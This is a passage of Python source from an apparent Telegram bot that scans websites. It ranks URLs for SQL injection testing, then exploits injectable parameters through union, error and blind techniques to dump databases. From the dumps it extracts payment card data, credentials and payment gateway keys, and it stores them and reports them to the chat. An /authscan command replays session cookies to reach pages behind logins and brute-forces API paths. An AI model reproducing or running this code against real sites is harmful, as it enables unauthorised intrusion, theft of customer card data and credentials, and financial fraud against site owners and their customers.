        for candidate in sqli_candidates:
            all_sqli_targets.add(candidate['url'])
        all_sqli_targets.update(discovered_param_urls)
        
        # Sort by priority (id, cat, pid params first)
        def _sqli_priority(u):
            qs = _urlparse(u).query.lower()
            score = 0
            high_params = ['id', 'cat', 'pid', 'item', 'product', 'page', 'article', 'news',
                          'view', 'category', 'show', 'select', 'report', 'action']
            for hp in high_params:
                if f"{hp}=" in qs:
                    score += 10
            if "search" in qs or "query" in qs or "q=" in qs:
                score += 6
            return score
        
        sorted_targets = sorted(all_sqli_targets, key=_sqli_priority, reverse=True)
        max_sqli_test = 50  # Test up to 50 URLs
        targets_to_test = sorted_targets[:max_sqli_test]
        
        if targets_to_test:
            await update.message.reply_text(
                f"⏳ Phase 4: SQLi Testing <b>{len(targets_to_test)}</b> endpoints "
                f"(URL + Cookie + Header + POST injection)...\n"
                f"WAF: {waf_name or 'None detected'}",
                parse_mode="HTML"
            )
            
            for idx, target_url in enumerate(targets_to_test):
                try:
                    # Extract cookies for this specific URL too
                    if p.config.cookie_extraction_enabled and target_url not in [url]:
                        try:
                            tjar = await p.sqli_scanner.extract_cookies(target_url, session)
                            if tjar.cookies:
                                for name, value in tjar.cookies.items():
                                    if name not in all_cookies:
                                        all_cookies[name] = value
                                        p.db.add_cookie(target_url, name, value, "sqli_scan")
                                for name, value in tjar.b3_cookies.items():
                                    if name not in all_b3_cookies:
                                        all_b3_cookies[name] = value
                                        p.db.add_b3_cookie(target_url, name, value)
                        except Exception:
                            pass
                    
                    results = await p.sqli_scanner.scan(target_url, session, waf_name=waf_name)
                    sqli_tested += 1
                    
                    if results:
                        for r in results:
                            all_sqli_results.append({
                                "url": r.url,
                                "param": r.parameter,
                                "technique": r.technique,
                                "injection_type": r.injection_type,
                                "injection_point": getattr(r, 'injection_point', 'url'),
                                "dbms": r.dbms or "Unknown",
                                "column_count": r.column_count,
                                "db_version": r.db_version,
                                "current_db": r.current_db,
                                "current_user": r.current_user,
                            })
                            
                            # Track
                            p.vulnerable_urls.append({
                                "url": r.url,
                                "param": r.parameter,
                                "type": r.injection_type,
                                "dbms": r.dbms,
                                "injection_point": getattr(r, 'injection_point', 'url'),
                                "time": datetime.now().isoformat(),
                            })
                            p.db.add_vulnerable_url({
                                "url": r.url, "param": r.parameter,
                                "type": r.injection_type, "dbms": r.dbms,
                                "injection_point": getattr(r, 'injection_point', 'url'),
                                "time": datetime.now().isoformat(),
                            })
                            
                            # Report 
                            await p.reporter.report_sqli_vuln(
                                r.url, r.parameter, r.dbms or "Unknown",
                                r.injection_type,
                                {
                                    "db_version": r.db_version,
                                    "current_db": r.current_db,
                                    "column_count": r.column_count,
                                    "injection_point": getattr(r, 'injection_point', 'url'),
                                    "source": "/scan",
                                }
                            )
                            
                            # ═══════ PHASE 5: Exploit + Dump ═══════
                            if p.config.dumper_enabled and r.injection_type in ("union", "error"):
                                await update.message.reply_text(
                                    f"💉 <b>Injectable!</b> Exploiting {r.injection_type}-based SQLi\n"
                                    f"Param: <code>{r.parameter}</code> ({getattr(r, 'injection_point', 'url')})\n"
                                    f"DBMS: {r.dbms or 'Unknown'} | Columns: {r.column_count}\n"
                                    f"Dumping tables & data...",
                                    parse_mode="HTML"
                                )
                                
                                try:
                                    dump = await p.dumper.targeted_dump(r, session)
                                    
                                    if dump.has_valuable_data or dump.total_rows > 0:
                                        saved = p.dumper.save_dump(dump)
                                        
                                        dump_info = {
                                            "url": r.url, "param": r.parameter,
                                            "dbms": dump.dbms, "database": dump.database,
                                            "tables": len(dump.tables),
                                            "total_rows": dump.total_rows,
                                            "cards": len(dump.card_data),
                                            "credentials": len(dump.credentials),
                                            "gateway_keys": len(dump.gateway_keys),
                                            "files": saved,
                                        }
                                        all_dump_results.append(dump_info)
                                        
                                        await p.reporter.report_data_dump(
                                            r.url, dump.dbms, dump.database,
                                            dump.tables,
                                            {t: len(rows) for t, rows in dump.data.items()},
                                            saved,
                                        )
                                        
                                        if dump.card_data:
                                            p.found_cards.extend(dump.card_data)
                                            for card in dump.card_data:
                                                p.db.add_card_data(r.url, card)
                                            await p.reporter.report_card_data(r.url, dump.card_data)
                                        
                                        if dump.credentials:
                                            for cred in dump.credentials:
                                                p.found_secrets.append({
                                                    "url": r.url, "type": "db_credential",
                                                    "value": str(cred), "source": "sqli_dump",
                                                    "time": datetime.now().isoformat(),
                                                })
                                        
                                        if dump.gateway_keys:
                                            for key_entry in dump.gateway_keys:
                                                for col, val in key_entry.items():
                                                    p.found_gateways.append({
                                                        "url": r.url, "type": f"db_{col}",
                                                        "value": val, "source": "sqli_dump",
                                                        "time": datetime.now().isoformat(),
                                                    })
                                                    p.db.add_gateway_key(r.url, f"db_{col}", val, source="sqli_dump")
                                                    await p.reporter.report_gateway(
                                                        r.url, f"DB: {col}", val,
                                                        {"source": "SQL injection dump via /scan"}
                                                    )
                                        
                                        dump_text = (
                                            f"📦 <b>Data Dump Successful!</b>\n"
                                            f"DB: {dump.database or 'N/A'} ({dump.dbms})\n"
                                            f"Tables: {len(dump.tables)} | Rows: {dump.total_rows}\n"
                                        )
                                        if dump.card_data:
                                            dump_text += f"💳 <b>Card Data: {len(dump.card_data)} entries</b>\n"
                                        if dump.credentials:
                                            dump_text += f"🔐 Credentials: {len(dump.credentials)}\n"
                                        if dump.gateway_keys:
                                            dump_text += f"🔑 Gateway Keys: {len(dump.gateway_keys)}\n"
                                        if dump.raw_dumps:
                                            dump_text += f"📄 DIOS Dumps: {len(dump.raw_dumps)}\n"
                                        await update.message.reply_text(dump_text, parse_mode="HTML")
                                    else:
                                        all_dump_results.append({
                                            "url": r.url, "param": r.parameter,
                                            "dbms": dump.dbms, "tables": len(dump.tables),
                                            "total_rows": dump.total_rows,
                                            "cards": 0, "credentials": 0, "gateway_keys": 0,
                                        })
                                
                                except Exception as dump_err:
                                    logger.error(f"Dump error: {dump_err}")
                                    await update.message.reply_text(
                                        f"⚠️ Injection confirmed but dump failed: {str(dump_err)[:100]}",
                                        parse_mode="HTML"
                                    )
                            
                            # Blind dumping (boolean/time-based)
                            elif (p.config.dumper_enabled and p.config.dumper_blind_enabled
                                  and r.injection_type in ("boolean", "time")):
                                await update.message.reply_text(
                                    f"💉 <b>Blind Injectable!</b> Exploiting {r.injection_type}-based SQLi\n"
                                    f"Param: <code>{r.parameter}</code>\n"
                                    f"DBMS: {r.dbms or 'Unknown'}\n"
                                    f"🐢 Extracting data char-by-char (this is slow)...",
                                    parse_mode="HTML"
                                )
                                
                                try:
                                    dump = await p.dumper.blind_targeted_dump(r, session)
                                    
                                    if dump.has_valuable_data or dump.total_rows > 0:
                                        saved = p.dumper.save_dump(dump, prefix="blind_")
                                        
                                        dump_info = {
                                            "url": r.url, "param": r.parameter,
                                            "type": f"blind_{r.injection_type}",
                                            "dbms": dump.dbms, "database": dump.database,
                                            "tables": len(dump.tables),
                                            "total_rows": dump.total_rows,
                                            "cards": len(dump.card_data),
                                            "credentials": len(dump.credentials),
                                            "gateway_keys": len(dump.gateway_keys),
                                            "files": saved,
                                        }
                                        all_dump_results.append(dump_info)
                                        
                                        await p.reporter.report_data_dump(
                                            r.url, dump.dbms, dump.database,
                                            dump.tables,
                                            {t: len(rows) for t, rows in dump.data.items()},
                                            saved,
                                        )
                                        
                                        if dump.card_data:
                                            p.found_cards.extend(dump.card_data)
                                            for card in dump.card_data:
                                                p.db.add_card_data(r.url, card)
                                            await p.reporter.report_card_data(r.url, dump.card_data)
                                        
                                        if dump.credentials:
                                            for cred in dump.credentials:
                                                p.found_secrets.append({
                                                    "url": r.url, "type": "db_credential",
                                                    "value": str(cred), "source": "blind_sqli_dump",
                                                    "time": datetime.now().isoformat(),
                                                })
                                        
                                        if dump.gateway_keys:
                                            for key_entry in dump.gateway_keys:
                                                for col, val in key_entry.items():
                                                    p.found_gateways.append({
                                                        "url": r.url, "type": f"db_{col}",
                                                        "value": val, "source": "blind_sqli_dump",
                                                        "time": datetime.now().isoformat(),
                                                    })
                                                    p.db.add_gateway_key(r.url, f"db_{col}", val, source="blind_sqli_dump")
                                                    await p.reporter.report_gateway(
                                                        r.url, f"DB: {col}", val,
                                                        {"source": f"Blind {r.injection_type} SQLi dump via /scan"}
                                                    )
                                        
                                        dump_text = (
                                            f"🐢📦 <b>Blind Dump Successful!</b>\n"
                                            f"Type: {r.injection_type}-based\n"
                                            f"DB: {dump.database or 'N/A'} ({dump.dbms})\n"
                                            f"Tables: {len(dump.tables)} | Rows: {dump.total_rows}\n"
                                        )
                                        if dump.card_data:
                                            dump_text += f"💳 <b>Card Data: {len(dump.card_data)} entries</b>\n"
                                        if dump.credentials:
                                            dump_text += f"🔐 Credentials: {len(dump.credentials)}\n"
                                        if dump.gateway_keys:
                                            dump_text += f"🔑 Gateway Keys: {len(dump.gateway_keys)}\n"
                                        await update.message.reply_text(dump_text, parse_mode="HTML")
                                    else:
                                        all_dump_results.append({
                                            "url": r.url, "param": r.parameter,
                                            "type": f"blind_{r.injection_type}",
                                            "dbms": dump.dbms, "tables": len(dump.tables),
                                            "total_rows": dump.total_rows,
                                            "cards": 0, "credentials": 0, "gateway_keys": 0,
                                        })
                                
                                except Exception as dump_err:
                                    logger.error(f"Blind dump error: {dump_err}")
                                    await update.message.reply_text(
                                        f"⚠️ Blind injection confirmed but dump failed: {str(dump_err)[:100]}",
                                        parse_mode="HTML"
                                    )
                    
                    # Progress every 10 targets
                    if (idx + 1) % 10 == 0:
                        await update.message.reply_text(
                            f"🔓 SQLi progress: {idx+1}/{len(targets_to_test)} tested | "
                            f"Found: {len(all_sqli_results)} vulns",
                            parse_mode="HTML"
                        )
                    
                except Exception:
                    continue
        
        # Save state
        p._save_state()
    
    # Report gateway secrets  
    for secret in all_secrets:
        if secret.category == "gateway":
            p.found_gateways.append({
                "url": secret.url, "type": secret.type,
                "value": secret.value, "time": datetime.now().isoformat(),
            })
            p.db.add_gateway_key(secret.url, secret.type, secret.value,
                                source="scan_command", confidence=secret.confidence)
            await p.reporter.report_gateway(
                secret.url, secret.type, secret.value,
                {"confidence": secret.confidence}
            )
    
    # ═══════ BUILD FINAL REPORT ═══════
    text = f"━━━━━━━━━━━━━━━━━━━━\n🔍 <b>Full Domain Scan Report</b>\n━━━━━━━━━━━━━━━━━━━━\n"
    text += f"🌐 Target: <code>{url}</code>\n"
    text += f"📄 Pages Crawled: {total_pages_found}\n"
    text += f"🔗 Param URLs Found: {len(discovered_param_urls)}\n"
    text += f"🔓 SQLi Endpoints Tested: {sqli_tested}\n\n"
    
    # ── Cookies (ALL of them) ──
    text += f"<b>🍪 Cookies ({len(all_cookies)}):</b>\n"
    if all_cookies:
        cookie_hints_batch = []
        for name, value in sorted(all_cookies.items()):
            tag = ""
            nl = name.lower()
            b3_names = {"x-b3-traceid", "x-b3-spanid", "x-b3-parentspanid", "x-b3-sampled", "x-b3-flags", "b3"}
            sess_patterns = ["sessid", "session", "phpsessid", "jsessionid", "asp.net", "connect.sid"]
            auth_patterns = ["token", "auth", "jwt", "csrf", "xsrf", "login"]
            if nl in b3_names:
                tag = " 🔵"
            elif any(p in nl for p in sess_patterns):
                tag = " 🔐"
            elif any(p in nl for p in auth_patterns):
                tag = " 🔑"
            text += f"  <code>{name}={value[:50]}</code>{tag}\n"
            # Cookie hint
            hint = get_cookie_hint(name, value)
            if hint:
                cookie_hints_batch.append(hint)
        if cookie_hints_batch:
            text += "\n  <b>💡 Cookie Intelligence:</b>\n"
            for ch in cookie_hints_batch[:8]:
                text += f"  {ch}\n\n"
    else:
        text += "  None found\n"
    
    if all_b3_cookies:
        text += f"\n  🔵 <b>B3 Tracing: {len(all_b3_cookies)}</b>\n"
        for name, value in all_b3_cookies.items():
            text += f"    <code>{name}={value}</code>\n"
    text += "\n"
    
    # ── SPA Intelligence ──
    if js_analysis_result and (js_analysis_result.api_endpoints or js_analysis_result.secrets or js_analysis_result.page_routes):
        text += f"<b>🔬 SPA Intelligence:</b>\n"
        if detected_framework:
            text += f"  Framework: {detected_framework}"
            if js_analysis_result.build_tool:
                text += f" ({js_analysis_result.build_tool})"
            text += "\n"
        text += f"  JS files: {js_analysis_result.js_files_analyzed} ({js_analysis_result.total_js_bytes // 1024} KB)\n"
        if js_analysis_result.api_endpoints:
            text += f"  API endpoints: {len(js_analysis_result.api_endpoints)}\n"
        if js_analysis_result.secrets:
            text += f"  JS secrets: {len(js_analysis_result.secrets)}\n"
        if js_analysis_result.page_routes:
            text += f"  Routes: {len(js_analysis_result.page_routes)}\n"
        if js_analysis_result.graphql_endpoints:
            text += f"  GraphQL: {', '.join(js_analysis_result.graphql_endpoints[:2])}\n"
        if js_analysis_result.source_maps:
            text += f"  ⚠️ Source maps exposed: {len(js_analysis_result.source_maps)}\n"
        if js_analysis_result.env_vars:
            text += f"  Env vars leaked: {len(js_analysis_result.env_vars)}\n"
        text += "\n"
    
    if api_brute_result and api_brute_result.endpoints_found:
        text += f"<b>🔨 API Discovery:</b>\n"
        text += f"  Probed: {api_brute_result.endpoints_probed}\n"
        text += f"  Open: {len(api_brute_result.open_endpoints)}\n"
        text += f"  Auth-required: {len(api_brute_result.auth_endpoints)}\n"
        if api_brute_result.graphql_introspection:
            text += "  📊 GraphQL introspection OPEN\n"
        if api_brute_result.openapi_spec_url:
            text += f"  📋 OpenAPI spec: {api_brute_result.openapi_spec_url[:60]}\n"
            text += f"  📋 Parsed endpoints: {len(api_brute_result.openapi_endpoints)}\n"
        text += "\n"
    
    if spa_result and not spa_result.error:
        spa_items = len(spa_result.forms) + len(spa_result.api_calls) + len(spa_result.param_urls)
        if spa_items > 0:
            text += f"<b>🌐 SPA Rendering:</b>\n"
            if spa_result.forms:
                text += f"  Forms: {len(spa_result.forms)}\n"
            if spa_result.api_calls:
                text += f"  Intercepted API calls: {len(spa_result.api_calls)}\n"
            if spa_result.param_urls:
                text += f"  Param URLs: {len(spa_result.param_urls)}\n"
            if spa_result.internal_links:
                text += f"  Internal links: {len(spa_result.internal_links)}\n"
            text += "\n"
    
    # ── Platform ──
    if platform_info:
        if platform_info.get('platform'):
            text += f"<b>Platform:</b> {platform_info['platform']}\n"
        if platform_info.get('gateways'):
            text += f"<b>Gateways:</b> {', '.join(platform_info['gateways'])}\n"
        else:
            text += f"<b>Gateways:</b> ❌ None detected\n"
        if platform_info.get('form_type'):
            text += f"<b>Form Type:</b> {platform_info['form_type']}\n"
        text += f"AJAX: {'✅' if platform_info.get('has_ajax') else '❌'} | "
        text += f"Nonce: {'✅' if platform_info.get('has_nonce') else '❌'} | "
        text += f"Captcha: {'⚠️' if platform_info.get('has_captcha') else '✅ None'}\n\n"
    
    # ── WAF ──
    if waf_result:
        text += f"<b>🛡 Protection:</b>\n"
        parts = []
        if waf_result.get("name"):
            parts.append(f"WAF: {waf_result['name']}")
        if waf_result.get("cdn"):
            parts.append(f"CDN: {waf_result['cdn']}")
        if waf_result.get("bot_protection"):
            parts.append(f"Bot: {waf_result['bot_protection']}")
        if waf_result.get("cms"):
            parts.append(f"CMS: {waf_result['cms']}")
        text += "  " + " | ".join(parts) if parts else "  None"
        text += "\n"
        # WAF + CMS hints
        waf_hint = get_waf_hint(
            waf_name=waf_result.get("name", ""),
            cms_name=waf_result.get("cms", "")
        )
        if waf_hint:
            text += f"  💡 {waf_hint}\n"
        text += "\n"
    
    # ── Secrets ──
    if all_secrets:
        gateway_secrets = [s for s in all_secrets if s.category == "gateway"]
        other_secrets = [s for s in all_secrets if s.category != "gateway"]
        
        if gateway_secrets:
            text += f"<b>🔑 Gateway Keys ({len(gateway_secrets)}):</b>\n"
            for s in gateway_secrets:
                text += f"  <b>{s.key_name}</b>\n"
                text += f"  <code>{s.value[:80]}</code>\n"
                text += f"  📍 {s.url}\n"
                hint = get_secret_hint(s.type, s.value, s.key_name)
                if hint:
                    text += f"  {hint}\n"
                text += "\n"
        
        if other_secrets:
            text += f"<b>🔐 Other Secrets ({len(other_secrets)}):</b>\n"
            for s in other_secrets[:15]:
                text += f"  <b>{s.key_name}</b>: <code>{s.value[:50]}</code>\n"
                hint = get_secret_hint(s.type, s.value, s.key_name)
                if hint:
                    text += f"  {hint}\n"
            if len(other_secrets) > 15:
                text += f"  ... +{len(other_secrets) - 15} more\n"
            text += "\n"
    else:
        text += "🔐 No secrets/keys found.\n\n"
    
    # ── Endpoints ──
    total_endpoints = sum(len(v) for v in all_endpoints.values() if isinstance(v, list))
    if total_endpoints > 0:
        text += f"<b>🌐 Endpoints ({total_endpoints}):</b>\n"
        ep_labels = {
            "ajax_endpoints": "⚡ AJAX", "rest_api": "🔗 REST",
            "form_actions": "📝 Forms", "login_pages": "🔐 Login",
            "search_endpoints": "🔎 Search", "param_urls": "❓ Params",
            "file_upload": "📤 Upload", "admin_pages": "👤 Admin",
            "api_calls": "🌍 ExtAPI", "interesting_js": "📜 JS",
        }
        ep_hints_batch = []
        for key, label in ep_labels.items():
            eps = all_endpoints.get(key, [])
            if eps:
                text += f"  {label}: {len(eps)}\n"
                eh = get_endpoint_hint(key)
                if eh:
                    ep_hints_batch.append(eh)
        if ep_hints_batch:
            text += "\n  <b>💡 Endpoint Intelligence:</b>\n"
            for eh in ep_hints_batch:
                text += f"  {eh}\n\n"
        text += "\n"
    
    # ── SQLi ──
    if all_sqli_results:
        text += f"<b>🔓 SQL Injection ({len(all_sqli_results)}):</b>\n"
        sqli_hints_shown = set()
        for r in all_sqli_results:
            text += f"  ⚠️ <b>{r['technique']}</b> ({r['injection_type']}) via {r.get('injection_point', 'url')}\n"
            text += f"     Param: <code>{r['param']}</code> | DBMS: {r['dbms']}\n"
            if r.get('db_version'):
                text += f"     Version: {r['db_version']}\n"
            if r.get('current_db'):
                text += f"     DB: {r['current_db']}\n"
            text += f"     <code>{r['url'][:70]}</code>\n\n"
        # Aggregate SQLi hints by technique type (avoid duplicates)
        text += "  <b>💡 SQLi Intelligence:</b>\n"
        for r in all_sqli_results:
            tech = r.get('technique', '').lower()
            point = r.get('injection_point', 'url').lower()
            hint_key = f"{tech}_{point}"
            if hint_key not in sqli_hints_shown:
                sqli_hints_shown.add(hint_key)
                sh = get_sqli_hint(tech, point)
                if sh:
                    text += f"  {sh}\n\n"
    elif sqli_tested > 0:
        text += f"🔓 Tested {sqli_tested} endpoints — none injectable\n\n"
    else:
        text += f"🔓 No testable endpoints found\n\n"
    
    # ── Dumps ──
    if all_dump_results:
        text += f"<b>📦 Data Dumps ({len(all_dump_results)}):</b>\n"
        for d in all_dump_results:
            text += f"  DB: {d.get('database', '?')} ({d.get('dbms', '?')})\n"
            text += f"  Tables: {d.get('tables', 0)} | Rows: {d.get('total_rows', 0)}\n"
            if d.get('cards', 0) > 0:
                text += f"  💳 Cards: {d['cards']}\n"
            if d.get('credentials', 0) > 0:
                text += f"  🔐 Credentials: {d['credentials']}\n"
            if d.get('gateway_keys', 0) > 0:
                text += f"  🔑 Gateway Keys: {d['gateway_keys']}\n"
            # Dump hint
            dump_h = get_dump_hint(
                tables_found=d.get('tables', 0),
                has_users=d.get('credentials', 0) > 0,
                has_cards=d.get('cards', 0) > 0,
                dbms=d.get('dbms', '')
            )
            text += f"  💡 {dump_h}\n"
            text += "\n"
    
    # ── Ports (v3.10) ──
    if all_port_results:
        text += f"<b>🔌 Open Ports ({len(all_port_results)}):</b>\n"
        for pr in all_port_results:
            risk_icon = "🔴" if pr['risk'] == 'high' else ("🟡" if pr['risk'] == 'medium' else "🟢")
            text += f"  {risk_icon} <b>{pr['port']}</b> ({pr['service']}"
            if pr.get('version'):
                text += f" {pr['version']}"
            text += ")\n"
            ph = get_port_hint(pr['port'])
            if ph:
                text += f"     💡 {ph}\n"
        text += "\n"
    
    # ── Contextual Intelligence (combined findings) ──
    ctx_hints = get_contextual_hints(
        url=url,
        cookies=all_cookies if all_cookies else None,
        secrets=all_secrets if all_secrets else None,
        waf=waf_result,
        endpoints=all_endpoints if all_endpoints else None,
    )
    if ctx_hints:
        text += "<b>🧠 Combined Intelligence:</b>\n"
        for ch in ctx_hints:
            text += f"{ch}\n\n"
    
    text += "━━━━━━━━━━━━━━━━━━━━"
    
    # Split for Telegram limit
    if len(text) > 4000:
        parts = [text[i:i+4000] for i in range(0, len(text), 4000)]
        for part in parts:
            await update.message.reply_text(part, parse_mode="HTML")
    else:
        await update.message.reply_text(text, parse_mode="HTML")


async def cmd_deepscan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /deepscan — alias for /scan (full domain scan)."""
    await cmd_scan(update, context)


async def cmd_authscan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /authscan command — authenticated scan with session cookies.
    
    Usage:
        /authscan <url> cookie1=value1 cookie2=value2
        /authscan <url> "Cookie: session=abc123; token=xyz"
        /authscan <url> session=abc123
    
    Scans behind login walls by injecting your session cookies.
    Uses Playwright (JS rendering) + cookie injection to access
    authenticated dashboards, admin panels, API endpoints.
    """
    if not context.args or len(context.args) < 2:
        await update.message.reply_text(
            "<b>🔐 Authenticated Scan</b>\n\n"
            "Usage:\n"
            "<code>/authscan https://site.com session=abc123 token=xyz</code>\n"
            "<code>/authscan https://site.com \"Cookie: name=val; name2=val\"</code>\n\n"
            "Scans behind login walls using your session cookies.\n"
            "Uses Playwright + FlareSolverr for full JS rendering.\n\n"
            "Steps:\n"
            "1. Log into the target site in your browser\n"
            "2. Copy your session cookies from DevTools\n"
            "3. Run /authscan with the URL and cookies\n\n"
            "The scanner will:\n"
            "• Render the page with your cookies (sees dashboard)\n"
            "• Intercept all API calls the page makes\n"
            "• Discover forms/params in the rendered DOM\n"
            "• Analyze JS bundles for hidden endpoints\n"
            "• Bruteforce API paths with your session\n"
            "• Test discovered endpoints for SQLi",
            parse_mode="HTML"
        )
        return
    
    chat_id = update.effective_chat.id
    existing = scan_tasks.get(chat_id)
    if existing and not existing.done():
        await update.message.reply_text("⚠️ A scan is already running. Use /stopscan to cancel it first.")
        return
    
    url = context.args[0]
    if not url.startswith("http"):
        url = "https://" + url
    
    # Parse cookies from remaining args
    cookie_args = " ".join(context.args[1:])
    cookies = {}
    
    # Try "Cookie: name=val; name2=val" format
    if cookie_args.startswith('"') or cookie_args.startswith("Cookie:"):
        cookie_str = cookie_args.strip('"').strip("'")
        if cookie_str.startswith("Cookie:"):
            cookie_str = cookie_str[7:].strip()
        for pair in cookie_str.split(";"):
            pair = pair.strip()
            if "=" in pair:
                k, v = pair.split("=", 1)
                cookies[k.strip()] = v.strip()
    else:
        # Try name=value name2=value2 format
        for arg in context.args[1:]:
            if "=" in arg:
                k, v = arg.split("=", 1)
                cookies[k.strip()] = v.strip()
    
    if not cookies:
        await update.message.reply_text(
            "❌ No cookies parsed. Use format:\n"
            "<code>/authscan URL session=value token=value</code>",
            parse_mode="HTML"
        )
        return
    
    cookie_names = ", ".join(cookies.keys())
    await update.message.reply_text(
        f"🔐 <b>Authenticated Scan Starting</b>\n"
        f"🌐 Target: <code>{url}</code>\n"
        f"🍪 Cookies: {cookie_names}\n\n"
        f"Phase 1: Playwright SPA Rendering (with cookies)\n"
        f"Phase 2: JS Bundle Analysis\n"
        f"Phase 3: API Endpoint Discovery (authenticated)\n"
        f"Phase 4: Full scan pipeline on discoveries\n\n"
        f"Use /stopscan to cancel.",
        parse_mode="HTML"
    )
    
    async def _run_authscan():
        try:
            await _do_authscan(update, url, cookies)
        except asyncio.CancelledError:
            await update.message.reply_text("🛑 Authenticated scan cancelled.")
        except Exception as e:
            logger.error(f"Authscan error: {e}")
            await update.message.reply_text(f"❌ Authscan error: {str(e)[:200]}")
        finally:
            scan_tasks.pop(chat_id, None)
    
    task = asyncio.create_task(_run_authscan())
    scan_tasks[chat_id] = task


async def _do_authscan(update: Update, url: str, cookies: Dict[str, str]):
    """Authenticated domain scanner — uses injected cookies to scan behind login walls."""
    p = get_pipeline()
    
    from urllib.parse import urlparse as _urlparse
    
    parsed = _urlparse(url)
    base_domain = parsed.netloc
    base_url = f"{parsed.scheme}://{base_domain}"
    
    all_discovered_endpoints = set()
    all_param_urls = set()
    all_secrets = []
    all_api_calls = []
    detected_framework = ""
    
    # ═══ Phase 1: Playwright SPA Rendering with cookies ═══
    await update.message.reply_text("⏳ Phase 1: Rendering authenticated page with Playwright...", parse_mode="HTML")
    
    spa_result = None
    try:
        if _HAS_PLAYWRIGHT:
            spa_result = await spa_extract(
                url, cookies=cookies, wait_seconds=5.0,
                scroll=True, intercept_api=True,
            )
        else:
            spa_result = await spa_extract_with_flaresolverr(url, cookies=cookies)
        
        if spa_result and not spa_result.error:
            detected_framework = spa_result.framework
            
            msg = f"🌐 <b>Authenticated Page Rendered</b>\n"
            msg += f"  Title: {spa_result.title[:60]}\n" if spa_result.title else ""
            if spa_result.framework:
                msg += f"  Framework: <b>{spa_result.framework}</b>\n"
            msg += f"  Forms: {len(spa_result.forms)}\n"
            msg += f"  Links: {len(spa_result.internal_links)}\n"
            msg += f"  Param URLs: {len(spa_result.param_urls)}\n"
            msg += f"  API calls intercepted: {len(spa_result.api_calls)}\n"
            msg += f"  Cookies set: {len(spa_result.cookies)}\n"
            
            if spa_result.api_calls:
                msg += "\n  <b>Intercepted API Calls:</b>\n"
                for ac in spa_result.api_calls[:8]:
                    msg += f"    {ac.get('method','GET')} <code>{ac.get('url','')[:70]}</code>\n"
                if len(spa_result.api_calls) > 8:
                    msg += f"    ... +{len(spa_result.api_calls) - 8} more\n"
            
            await update.message.reply_text(msg, parse_mode="HTML")
            
            # Collect discoveries
            for pu in spa_result.param_urls:
                all_param_urls.add(pu)
            for il in spa_result.internal_links:
                all_discovered_endpoints.add(il)
            all_api_calls.extend(spa_result.api_calls)
            
            for ac in spa_result.api_calls:
                ac_url = ac.get("url", "")
                if ac_url:
                    all_discovered_endpoints.add(ac_url)
                    ac_parsed = _urlparse(ac_url)
                    if ac_parsed.query:
                        all_param_urls.add(ac_url)
        elif spa_result:
            await update.message.reply_text(f"⚠️ SPA rendering error: {spa_result.error[:200]}", parse_mode="HTML")
    except Exception as e:
        await update.message.reply_text(f"⚠️ SPA rendering failed: {str(e)[:200]}", parse_mode="HTML")
    
    # ═══ Phase 2: JS Bundle Analysis with cookies ═══
    await update.message.reply_text("⏳ Phase 2: JS Bundle Analysis (authenticated)...", parse_mode="HTML")
    
    js_result = None
    try:
        # Use rendered HTML from SPA extraction if available
        html_content = spa_result.rendered_html if spa_result and spa_result.rendered_html else None
        
        js_result = await analyze_js_bundles(
            url, cookies=cookies, html_content=html_content,
        )
        
        if js_result.api_endpoints or js_result.secrets:
            detected_framework = detected_framework or js_result.framework
            
            msg = f"🔬 <b>JS Bundle Analysis</b> ({js_result.js_files_analyzed} files)\n"
            if js_result.api_endpoints:
                msg += f"  API endpoints: {len(js_result.api_endpoints)}\n"
                for ep in js_result.api_endpoints[:5]:
                    msg += f"    {ep.method} <code>{ep.url[:70]}</code>\n"
            if js_result.secrets:
                msg += f"  Secrets: {len(js_result.secrets)}\n"
                for s in js_result.secrets[:3]:
                    msg += f"    [{s.secret_type}] {s.value[:40]}...\n"
            if js_result.page_routes:
                msg += f"  Routes: {len(js_result.page_routes)}\n"
            
            await update.message.reply_text(msg, parse_mode="HTML")
            
            for ep in js_result.api_endpoints:
                all_discovered_endpoints.add(ep.url)
                ep_p = _urlparse(ep.url)
                if ep_p.query:
                    all_param_urls.add(ep.url)
            
            for s in js_result.secrets:
                all_secrets.append(type('Secret', (), {
                    'url': url, 'type': s.secret_type, 'value': s.value,
                    'category': 'js_bundle', 'confidence': s.confidence,
                    'source': s.source_file,
                })())
            
            for route in js_result.page_routes:
                if route.startswith("/"):
                    all_discovered_endpoints.add(base_url + route)
    except Exception as e:
        logger.error(f"JS analysis error in authscan: {e}")
    
    # ═══ Phase 3: API Bruteforce with cookies ═══
    await update.message.reply_text("⏳ Phase 3: API Endpoint Discovery (authenticated)...", parse_mode="HTML")
    
    api_result = None
    try:
        custom_paths = []
        if js_result and js_result.page_routes:
            for route in js_result.page_routes:
                if route.startswith("/"):
                    custom_paths.append(route)
                    if not route.startswith("/api/"):
                        custom_paths.append(f"/api{route}")
        
        api_result = await bruteforce_api(
            url=url,
            framework=detected_framework,
            cookies=cookies,
            custom_paths=custom_paths if custom_paths else None,
        )
        
        if api_result.endpoints_found:
            msg = f"🔨 <b>API Discovery</b> ({api_result.endpoints_probed} probed)\n"
            msg += f"  Open: {len(api_result.open_endpoints)}\n"
            msg += f"  Auth-required: {len(api_result.auth_endpoints)}\n"
            
            for ep in api_result.open_endpoints[:5]:
                msg += f"  ✅ {ep.method} <code>{ep.url[:70]}</code> [{ep.status}]\n"
                if ep.reason:
                    msg += f"      → {ep.reason[:80]}\n"
            
            if api_result.graphql_introspection:
                msg += "  📊 <b>GraphQL introspection OPEN!</b>\n"
            
            await update.message.reply_text(msg, parse_mode="HTML")
            
            for ep in api_result.endpoints_found:
                all_discovered_endpoints.add(ep.url)
                ep_p = _urlparse(ep.url)
                if ep_p.query:
                    all_param_urls.add(ep.url)
    except Exception as e:
        logger.error(f"API bruteforce error in authscan: {e}")
    
    # ═══ Phase 4: Run full _do_scan on URL if we found stuff ═══
    total_found = len(all_discovered_endpoints) + len(all_param_urls)
    
    await update.message.reply_text(
        f"📊 <b>Auth Scan Discovery Summary</b>\n"
        f"  Total endpoints: {len(all_discovered_endpoints)}\n"
        f"  Param URLs: {len(all_param_urls)}\n"
        f"  API calls intercepted: {len(all_api_calls)}\n"
        f"  Secrets found: {len(all_secrets)}\n"
        f"  Framework: {detected_framework or 'unknown'}\n\n"
        f"Now running full scan pipeline on discoveries...",
        parse_mode="HTML"
    )
    
    # Run the standard _do_scan which includes the SPA intelligence phase
    await _do_scan(update, url)


async def cmd_mass(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /mass command — scan up to 25 URLs in sequence.
